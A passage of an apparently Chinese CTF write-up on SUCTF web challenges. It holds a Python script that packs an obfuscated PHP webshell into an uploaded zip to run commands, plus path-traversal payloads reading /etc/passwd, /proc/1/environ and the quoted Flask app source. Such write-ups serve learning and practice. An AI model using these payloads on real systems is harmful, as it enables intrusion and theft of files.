class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] === UPLOAD_ERR_OK) &#123;</span><br><span class="line">    <span class="variable">$uploadedFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$zipname</span> = <span class="variable">$uploadedFile</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$uploadDir</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用unzip，目录穿越，然后可以执行吗，这里的unzip不是内置的</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">unzip</span>(<span class="variable">$zipname</span>, <span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.html?status=success&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.html?status=<span class="subst">$result</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.html?status=file_error&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用idea3上传一个zip文件，先读取一下poc一下，kc1zs4.txt</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">mf = io.BytesIO()</span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(mf, mode=<span class="string">&quot;w&quot;</span>, compression=zipfile.ZIP_STORED) <span class="keyword">as</span> zf:</span><br><span class="line">    zf.writestr(<span class="string">&#x27;kc1zs4.txt&#x27;</span>, <span class="string">b&#x27;hello kc1zs4&#x27;</span>)</span><br><span class="line">    zf.writestr(<span class="string">&#x27;A&#x27;</span>*<span class="number">5000</span>, <span class="string">b&#x27;AAAAA&#x27;</span>) <span class="comment"># 构造出错</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;kc1zs4.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(mf.getvalue())</span><br></pre></td></tr></table></figure><ol><li><p>ok，接下来写上shell了嘻嘻，直接访问得到，nice，绕黑名单，phpinfo看看有没有disable_functions，有的话就要绕过了</p><ol><li>emm，info也要绕过<code>zf.writestr(&#39;kc1zs4.php&#39;, b&#39;&lt;?php $a=&quot;phpinf&quot;;$b=&quot;o&quot;;$c=$a.$b;$c();&#39;)</code></li><li>wc，确实有info，但是没有system()，搞笑呢？<ol><li><code>zf.writestr(&#39;kc1zs4.php&#39;, b&#39;&lt;?php $a=&quot;syst&quot;;$b=&quot;em&quot;;$c=$a.$b;echo $c(&quot;l&quot;.&quot;s /&quot;);&#39;)</code></li><li><code>zf.writestr(&#39;kc1zs4.php&#39;, b&#39;&lt;?php $a=&quot;syst&quot;;$b=&quot;em&quot;;$c=$a.$b;echo $c(&quot;ca&quot;.&quot;t /seef1ag_getfl4g&quot;);&#39;)</code></li><li>SUCTF{sti1l_w0t3r_Run_d@@p!!!}</li></ol></li><li>payload</li></ol>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://localhost:5000&quot;</span></span><br><span class="line">bp = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://localhost:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">### 生成zip文件</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">mf = io.BytesIO()</span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(mf, mode=<span class="string">&quot;w&quot;</span>, compression=zipfile.ZIP_STORED) <span class="keyword">as</span> zf:</span><br><span class="line">    <span class="comment"># phpinfo</span></span><br><span class="line">    <span class="comment"># zf.writestr(&#x27;kc1zs4.php&#x27;, b&#x27;&lt;?php $a=&quot;phpinf&quot;;$b=&quot;o&quot;;$c=$a.$b;$c();&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># system()</span></span><br><span class="line">    <span class="comment"># zf.writestr(&#x27;kc1zs4.php&#x27;, b&#x27;&lt;?php $a=&quot;syst&quot;;$b=&quot;em&quot;;$c=$a.$b;echo $c(\&#x27;$_POST[&quot;kc1zs4&quot;]\&#x27;);&#x27;)</span></span><br><span class="line">    <span class="comment"># zf.writestr(&#x27;kc1zs4.php&#x27;, b&#x27;&lt;?php $a=&quot;syst&quot;;$b=&quot;em&quot;;$c=$a.$b;echo $c(&quot;l&quot;.&quot;s /&quot;);&#x27;)</span></span><br><span class="line">    zf.writestr(<span class="string">&#x27;kc1zs4.php&#x27;</span>, <span class="string">b&#x27;&lt;?php $a=&quot;syst&quot;;$b=&quot;em&quot;;$c=$a.$b;echo $c(&quot;ca&quot;.&quot;t /seef1ag_getfl4g&quot;);&#x27;</span>)</span><br><span class="line">    zf.writestr(<span class="string">&#x27;A&#x27;</span>*<span class="number">5000</span>, <span class="string">b&#x27;AAAAA&#x27;</span>) <span class="comment"># 构造出错</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;kc1zs4.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(mf.getvalue())</span><br><span class="line"></span><br><span class="line"><span class="comment">### 报错的思路</span></span><br><span class="line"><span class="comment"># path_error=&quot;/error&quot;</span></span><br><span class="line"><span class="comment"># r = session.get(host+path_error, proxies=bp, timeout=5)</span></span><br><span class="line"><span class="comment"># print(r.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 发送一个zip看</span></span><br><span class="line">path_unzip=<span class="string">&quot;/unzip.php&quot;</span></span><br><span class="line">zip_file = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: (</span><br><span class="line">        <span class="string">&#x27;kc1zs4.zip&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;kc1zs4.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;application/zip&#x27;</span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">r = session.post(host+path_unzip, files=zip_file, proxies=bp, timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol></li></ol><h2 id="SU-blog"><a href="#SU-blog" class="headerlink" title="SU_blog"></a>SU_blog</h2><h3 id="SU-blog-环境配置"><a href="#SU-blog-环境配置" class="headerlink" title="SU_blog 环境配置"></a>SU_blog 环境配置</h3><ol><li>给了docker(ai: docker compose基本命令)<ol><li>进入Dockerfile项目根目录<code>docker-compose build</code></li><li>查看正在运行的服务<code>docker-compose ps</code></li><li>启动服务<code>docker-compose up -d</code>，-d指定后台运行</li><li>停止服务<code>docker-compose down</code></li></ol></li></ol><h3 id="SU-blog-分析-SV"><a href="#SU-blog-分析-SV" class="headerlink" title="SU_blog 分析| SV"></a>SU_blog 分析| SV</h3><ol><li><p>没有源码，注册个账号，进入，看看能不能拿源码</p></li><li><p>登录后拿到提示</p><ol><li>这个session像是flask</li><li>我最喜欢时间戳了，而且听说md5这种单项签名非常安全，所以我把博客诞生的时间当做了自己的SECRET</li><li>没法报错？</li></ol></li><li><p>目录穿越有没有找到和无权限两种，这个权限怎么办</p><ol><li><p>？？？注册一个admin的用户突然就有权限了？权限绕过这么ez？</p></li><li><p>articles&#x2F;….&#x2F;&#x2F;articles&#x2F;article1.txt可以读取到文件，方向应该是对的</p></li><li><p>article?file&#x3D;articles&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;etc&#x2F;passwd，成功读到</p></li><li><p>article?file&#x3D;articles&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;proc&#x2F;1&#x2F;environ 但是没有flag嘻嘻，肯定不会这么简单，想方法读读源码，猜测是flask框架，读运行目录</p></li><li><p>印象还有个cmdline是进程命令行参数的</p><ol><li>[<a href="https://www.cnblogs.com/niyani/p/17074125.html]">https://www.cnblogs.com/niyani/p/17074125.html]</a> 很像啊，有pythonapp&#x2F;app.py</li><li>articles&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;pythonapp&#x2F;app.py没有啊</li><li>直接app.py试一试，file&#x3D;articles&#x2F;….&#x2F;&#x2F;app.py，ok，读到源码，审计一下<ol><li>SECRET是否可以伪造</li><li>&#x2F;article的file可以是数组？</li><li>有waf.py，但黑名单，给出了pwaf和cwaf，不能读就只能盲注了，fenjing！<ol><li>key和value的waf似乎是不一样的</li></ol></li></ol></li></ol>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time,os,json,hashlib</span><br><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_</span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> pwaf,cwaf</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># 密钥是时间戳，可以伪造session吗</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = hashlib.md5(<span class="built_in">str</span>(<span class="built_in">int</span>(time.time())).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">users = &#123;<span class="string">&quot;testuser&quot;</span>: <span class="string">&quot;password&quot;</span>&#125;    <span class="comment"># 有一个给定的users</span></span><br><span class="line"><span class="comment"># 项目根目录</span></span><br><span class="line">BASE_DIR = <span class="string">&#x27;/var/www/html/myblog/app&#x27;</span></span><br><span class="line"></span><br><span class="line">articles = &#123;</span><br><span class="line">    <span class="number">1</span>: <span class="string">&quot;articles/article1.txt&quot;</span>,</span><br><span class="line">    <span class="number">2</span>: <span class="string">&quot;articles/article2.txt&quot;</span>,</span><br><span class="line">    <span class="number">3</span>: <span class="string">&quot;articles/article3.txt&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">friend_links = [</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;bkf1sh&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://ctf.org.cn/&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;fushuling&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://fushuling.com/&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;yulate&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://www.yulate.com/&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;zimablue&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://www.zimablue.life/&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;baozongwi&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://baozongwi.xyz/&quot;</span>&#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">user_data = User()</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">只判断session中的用户名</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;blog.html&#x27;</span>, articles=articles, friend_links=friend_links)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">登录成功就进行重定向</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username] == password:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid credentials&quot;</span>, <span class="number">403</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">注册后就放入users字典中</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        users[username] = password</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/change_password&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_password</span>():</span><br><span class="line">    <span class="comment"># 判断是否登录</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通过旧密码来鉴权</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        old_password = request.form[<span class="string">&#x27;old_password&#x27;</span>]</span><br><span class="line">        new_password = request.form[<span class="string">&#x27;new_password&#x27;</span>]</span><br><span class="line">        confirm_password = request.form[<span class="string">&#x27;confirm_password&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> users[session[<span class="string">&#x27;username&#x27;</span>]] != old_password:</span><br><span class="line">            flash(<span class="string">&quot;Old password is incorrect&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> new_password != confirm_password:</span><br><span class="line">            flash(<span class="string">&quot;New passwords do not match&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[session[<span class="string">&#x27;username&#x27;</span>]] = new_password</span><br><span class="line">            flash(<span class="string">&quot;Password changed successfully&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change_password.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">只有admin才可以访问/friendlinks，或者session中有username(也没啥)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/friendlinks&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">friendlinks</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;friendlinks.html&#x27;</span>, links=friend_links)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">要求同/friendlinks，应该能xss</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/add_friendlink&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_friendlink</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    url = request.form.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">and</span> url:</span><br><span class="line">        friend_links.append(&#123;<span class="string">&quot;name&quot;</span>: name, <span class="string">&quot;url&quot;</span>: url&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;friendlinks&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">要求同/friendlink</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/delete_friendlink/&lt;int:index&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_friendlink</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= index &lt; <span class="built_in">len</span>(friend_links):</span><br><span class="line">        <span class="keyword">del</span> friend_links[index]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;friendlinks&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/article&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">article</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    file_name = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file_name:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, file_name=<span class="string">&#x27;&#x27;</span>, content=<span class="string">&quot;未提供文件名。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    blacklist = [<span class="string">&quot;waf.py&quot;</span>]</span><br><span class="line">    <span class="comment"># 这里是允许file_name是数组吗</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(blacklisted_file <span class="keyword">in</span> file_name <span class="keyword">for</span> blacklisted_file <span class="keyword">in</span> blacklist):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="string">&quot;大黑阔不许看&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 需要指定个开头，想对了</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file_name.startswith(<span class="string">&#x27;articles/&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="string">&quot;无效的文件路径。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file_name <span class="keyword">not</span> <span class="keyword">in</span> articles.values():</span><br><span class="line">        <span class="comment"># 现在是admin了没有问题</span></span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span 